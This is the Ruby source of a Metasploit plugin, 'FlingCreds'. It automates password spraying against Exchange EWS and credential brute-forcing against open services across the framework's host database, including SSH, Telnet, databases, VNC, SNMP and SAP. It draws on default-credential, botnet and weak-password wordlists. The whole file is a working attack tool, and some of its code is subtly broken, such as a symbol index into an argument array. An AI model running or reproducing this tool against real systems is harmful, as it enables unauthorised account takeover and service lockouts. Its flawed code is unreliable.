module Msf
  class Plugin::FlingCreds < Msf::Plugin

    class FlingCredsCommandDispatcher
      include Msf::Ui::Console::CommandDispatcher

      def name
        "FlingCreds"
      end

      def commands
        {
            "spray_owa_ews_login" => "Conduct a password spraying attack against an Exchange EWS Service",
            "all_login" => "Conduct credential guessing attacks against services enforcing authentication"
        }
      end

      def cmd_spray_owa_ews_login(*args)
        range = nil
        pass_file = nil
        delay = nil
        iterations = nil
        verbose = false

        # Define options
        opts = Rex::Parser::Arguments.new(
            '-r' => [true,  'The IP addresses to spray, in CIDR notation or nmap format'],
            '-p' => [true,  'The path to a newline delimited file containing passwords'],
            '-s' => [true,  'The delay in seconds between each attack'],
            '-i' => [true,  'The number of passwords to attempt per attack'],
            '-v' => [false, 'Be verbose when running modules'],
            '-h' => [false, 'This help menu']
        )

        if args.length == 0 || args.include?('-h')
          print_line
          print 'This command automates the password spraying process against an Exchange EWS Service.'
          print_line
          print_line opts.usage
          return
        end

        opts.parse(args) do |opt, idx, val|
          case opt
          when '-r'
            # Make sure no spaces are in the range definition
            range = val.gsub(' ', '')
          when '-p'
            pass_file = val
            if not File.file? pass_file and not File.readable? pass_file
              print_error('The password file does not exist or is unreadable.')
              return
            end
          when '-s'
            delay = val.to_i
            if delay < 0
              print_error('The delay must be a positive number.')
              return
            end
          when '-i'
            iterations = val.to_i
            if iterations < 0
              print_error('The number of iterations must be a positive number.')
              return
            end
          when '-v'
            verbose = true
          end
        end

        unless range and pass_file and delay and iterations
          print_line
          print 'This command automates the password spraying process against an Exchange EWS Service.'
          print_line
          print_line opts.usage
          return
        end

        # Check that the range is a valid one
        ip_list = Rex::Socket::RangeWalker.new(range)
        ips_given = []
        ip_list.each do |i|
          ips_given << i
        end
        if ips_given.size.zero?
          print_error('The IP address range provided appears to be invalid.')
          return
        end

        # Read in passwords
        passwords = Array.new
        File.read(args[:pass_file]).each_line do |line|
          password = line.strip
          passwords << password unless password.empty?
        end

        # Spray
        count = 0
        passwords.each do |password|
          count += 1
          print_line
          print_status("[ #{Time.now.strftime('%d/%m/%Y %H:%M:%S')} ][ #{count}/#{passwords.length} ]")

          mname = 'scanner/http/owa_ews_login'
          mopts = {
              'RHOSTS'       => ips_given.join(" "),
              'RPORT'        => '443',
              'SSL'          => true,
              'DB_ALL_USERS' => true,
              'AUTODISCOVER' => false,
              'PASSWORD'     => password,
              'VERBOSE'      => verbose,
              'ShowProgress' => false
          }
          run_auxiliary_module(mname, mopts, as_job: false, quiet: false, dry_run: false)

          print_status("[ #{Time.now.strftime('%d/%m/%Y %H:%M:%S')} ]")
          if count % iterations == 0
            sleep delay
          end
        end
      end

      def cmd_all_login(*args)
        # Variables
        range = nil
        filter = []
        username = nil
        password = nil
        userfile = nil
        passfile = nil
        userpassfile = nil
        blank_passwords = false
        user_as_pass = false
        threads = 10
        maxjobs = 5
        verbose = false
        dry_run = false

        # Define options
        opts = Rex::Parser::Arguments.new(
            '-r' => [true, 'Filter database hosts based on IP address, in CIDR notation or nmap format [optional]'],
            '-u' => [true, 'Username for login attempt [optional]'],
            '-U' => [true, 'Load usernames from a file for login attempts [optional]'],
            '-p' => [true, 'Password for login attempt [optional]'],
            '-P' => [true, 'Load passwords from a file for login attempts [optional]'],
            '-C' => [true, 'Load usernames and passwords from a file for login attempts [optional]'],
            '-n' => [true, 'Try blank/null password for all users [optional]'],
            '-s' => [true, 'Try the username as the password for all users [optional]'],
            #'-t' => [false, 'Max number of threads per job [default: 10]'],
            '-j' => [true, 'Max number of concurrent jobs [default: 5]'],
            '-v' => [false, 'Be verbose when running modules'],
            '-d' => [false, 'Dry run, show what modules would run if executed'],
            '-h' => [false, 'This help menu']
        )

        if args.length == 0 || args.include?('-h')
          print_line
          print_line "Conduct credential guessing attacks against services enforcing authentication."
          print_line
          print_line opts.usage
          return
        end

        opts.parse(args) do |opt, idx, val|
          case opt
          when '-r'
            range = val.gsub(' ', '')
          when '-u'
            username = val
          when '-p'
            password = val
          when '-U'
            userfile = val
            if not File.file? userfile and not File.readable? userfile
              print_error('The username file does not exist or is unreadable.')
              return
            end
          when '-P'
            passfile = val
            if not File.file? passfile and not File.readable? passfile
              print_error('The password file does not exist or is unreadable.')
              return
            end
          when '-C'
            userpassfile = val
            if not File.file? userpassfile and not File.readable? userpassfile
              print_error('The userpass file does not exist or is unreadable.')
              return
            end
          when '-n'
            blank_passwords = val
          when '-s'
            user_as_pass = val
          when '-t'
            threads = val.to_i
          when '-j'
            maxjobs = val.to_i
          when '-v'
            verbose = true
          when '-d'
            dry_run = true
          end
        end

        # Check that the filter (if provided) is a valid one
        filter = nil
        if range
          filter = Rex::Socket::RangeWalker.new(range)
          if not filter.valid?
            print_error('The IP address range provided appears to be invalid.')
            return
          end
        end

        user_wordlists = File.join(Msf::Config.config_directory, 'data', 'wordlists')

        framework.db.workspace.hosts.each do |host|
          if filter.nil? or filter.include?(host.address)
            host.services.where(state: 'open').each do |s|
              mopts = {
                  'RHOSTS'          => host.address,
                  'RPORT'           => s.port,
                  'BLANK_PASSWORDS' => blank_passwords,
                  'USER_AS_PASS'    => user_as_pass,
                  'THREADS'         => threads,
                  'USERPASS_FILE'   => userpassfile,
                  'USERNAME'        => username,
                  'PASSWORD'        => password,
                  'USER_FILE'       => userfile,
                  'PASS_FILE'       => passfile,
                  'VERBOSE'         => verbose,
                  'ShowProgress'    => false
              }

              ########## COUCHDB ##########
              if s.name.to_s == 'couchdb' or s.port == 5984
                mname = 'scanner/couchdb/couchdb_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'http-default.txt')
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## FTP ##########
              elsif s.name.to_s == 'ftp' or s.port == 21
                mname = 'scanner/ftp/ftp_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'ftp-default.txt')
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## MONGODB ##########
              elsif s.name.to_s == 'mongod' or s.port.to_s =~ /^27017$|^27018$|^27019$|^28017$/
                mname = 'scanner/mongodb/mongodb_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USER_FILE' => File.join(user_wordlists, 'users', 'short.txt'),
                          'PASS_FILE' => File.join(user_wordlists, 'passwords', 'probable.txt'),
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## MSSQL ##########
              elsif s.name.to_s =~ /mssql|ms-sql/ or s.port == 1433
                mname = 'scanner/mssql/mssql_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'mssql-default.txt')
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## MYSQL ##########
              elsif s.name.to_s == 'mysql' or s.port == 3306
                mname = 'scanner/mysql/mysql_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'mysql-default.txt')
                      })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERPASS_FILE' => nil,
                         'USERNAME' => 'root',
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'weak.txt'),
                         'STOP_ON_SUCCESS' => true
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERNAME' => 'root',
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'root.txt'),
                         'STOP_ON_SUCCESS' => true
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## ORACLE ##########
              elsif (s.port == 5560 or s.port == 7777) and s.name.to_s == 'http'
                mname = 'scanner/oracle/isqlplus_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'oracle-default.txt')
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## ORACLE ##########
              elsif s.port == 1521
                mname = 'scanner/oracle/oracle_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'oracle-default.txt')
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## PCANYWHERE ##########
              elsif s.name.to_s == 'pcanywheredata' or s.port == 5631
                mname = 'scanner/pcanywhere/pcanywhere_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USERNAME' => 'administrator',
                          'PASS_FILE' => File.join(user_wordlists, 'passwords', 'weak.txt'),
                          'STOP_ON_SUCCESS' => true
                      })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## POP3 ##########
              elsif s.name.to_s =~ /pop3|pop3s/ or s.port.to_s =~ /^110$|^995$/
                mname = 'scanner/pop3/pop3_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                          'USER_FILE' => File.join(user_wordlists, 'users', 'unix.txt'),
                          'PASS_FILE' => File.join(user_wordlists, 'passwords', 'probable.txt'),
                      })
                end
                mopts.update({ 'SSL' => true }) if s.port == 995 or s.name.to_s == 'pop3s'
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## POSTGRESQL ##########
              elsif s.name.to_s =~ /postgres|postgresql/ or s.port.to_s =~ /^5432$|^5433$/
                mname = 'scanner/postgres/postgres_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'postgres-default.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## REDIS ##########
              elsif s.name.to_s == 'redis' or s.port == 6379
                mname = 'scanner/redis/redis_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'PASSWORD' => 'foobared',
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'all.txt')
                     })
                end
                mopts.update({ 'STOP_ON_SUCCESS' => true })
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## REXEC ##########
              elsif s.port == 512
                mname = 'scanner/rservices/rexec_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USER_FILE' => File.join(user_wordlists, 'users', 'unix.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'probable.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## RLOGIN ##########
              elsif s.port == 513
                mname = 'scanner/rservices/rlogin_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'FROMUSER_FILE' => File.join(user_wordlists, 'users', 'unix.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## RSH ##########
              elsif s.port == 514
                mname = 'scanner/rservices/rsh_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'FROMUSER_FILE' => File.join(user_wordlists, 'users', 'unix.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## SAP ##########
              elsif s.port == 50013
                mname = 'scanner/sap/sap_mgmt_con_brute_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USER_FILE' => File.join(Msf::Config.data_directory, 'wordlists', 'sap_common.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'probable.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## SNMP ##########
              elsif (s.port == 161 and s.proto == 'udp') or s.name.to_s =~/snmp/
                mname = 'scanner/snmp/snmp_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'snmp.txt')
                     })
                end
                mopts.update({ 'STOP_ON_SUCCESS' => true })
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## SSH ##########
              elsif s.name.to_s == 'ssh' or s.port == 22
                mname = 'scanner/ssh/ssh_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'ssh-default.txt')
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'botnet.txt')
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERPASS_FILE' => nil,
                         'USER_FILE' => File.join(user_wordlists, 'users', 'short.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'weak.txt')
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USER_FILE' => File.join(user_wordlists, 'users', 'short.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'root.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## TELNET ##########
              elsif s.name.to_s == 'telnet' or s.port == 23
                mname = 'scanner/telnet/telnet_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'telnet-default.txt')
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'botnet.txt')
                     })
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USERPASS_FILE' => nil,
                         'USER_FILE' => File.join(user_wordlists, 'users', 'short.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'weak.txt')
                     })
                  run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                  jobwaiting(1, false, 'scanner')
                  mopts.update({
                         'USER_FILE' => File.join(user_wordlists, 'users', 'short.txt'),
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'root.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## VMWARE ##########
              elsif s.name.to_s =~ /vmware-auth|vmauth/ or s.port == 902
                mname = 'scanner/vmware/vmauthd_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'USERPASS_FILE' => File.join(user_wordlists, 'userpass', 'http-default.txt')
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')

              ########## VNC ##########
              elsif s.name.to_s =~ /vnc/i or s.port == 5900
                mname = 'scanner/vnc/vnc_login'
                if username.nil? and password.nil? and userfile.nil? and passfile.nil? and userpassfile.nil?
                  mopts.update({
                         'PASS_FILE' => File.join(user_wordlists, 'passwords', 'vnc.txt'),
                         'STOP_ON_SUCCESS' => true
                     })
                end
                run_auxiliary_module(mname, mopts, as_job: true, quiet: false, dry_run: dry_run)
                jobwaiting(maxjobs, false, 'scanner')
              end
            end
          end
        end
        jobwaiting(1, false, 'scanner')
      end

      # Method for running auxiliary modules given the module name and options in a hash
      def run_auxiliary_module(mod, opts, as_job: true, quiet: false, dry_run: false)
        m = framework.auxiliary.create(mod)
        if not m.nil?
          opts.each do |o, v|
            m.datastore[o] = v
          end
          m.options.validate(m.datastore)
          if not dry_run
            m.run_simple(
                'LocalInput' => driver.input,
                'LocalOutput' => driver.output,
                'RunAsJob' => as_job,
                'Quiet' => quiet
            )
            print_status("[ #{Time.now.strftime('%d/%m/%Y %H:%M:%S')} ] Running module auxiliary/#{mod} against #{opts['RHOSTS']}:#{opts['RPORT']}")
          else
            print_status("Would run module auxiliary/#{mod} against #{opts['RHOSTS']}:#{opts['RPORT']}")
          end
        else
          print_error("Module auxiliary/#{mod} does not exist")
        end
      end

      # Get the specific count of jobs which name contains a specified text
      def get_job_count(type='scanner')
        job_count = 0
        framework.jobs.each do |k, j|
          if j.name =~ /#{type}/
            job_count = job_count + 1
          end
        end
        return job_count
      end


      # Wait for commands to finish
      def jobwaiting(maxjobs, verbose, jtype)
        while (get_job_count(jtype) >= maxjobs)
          ::IO.select(nil, nil, nil, 2.5)
          if verbose
            print_status('waiting for modules to finish')
          end
        end
      end
    end

    def initialize(framework, opts)
      super

      add_console_dispatcher(FlingCredsCommandDispatcher)

      print_status("FlingCreds plugin version 0.9.0 loaded")
    end

    def cleanup
      remove_console_dispatcher('FlingCreds')
    end

    def name
      "flingcreds"
    end

    def desc
      "FlingCreds plugin"
    end

    protected
  end
end
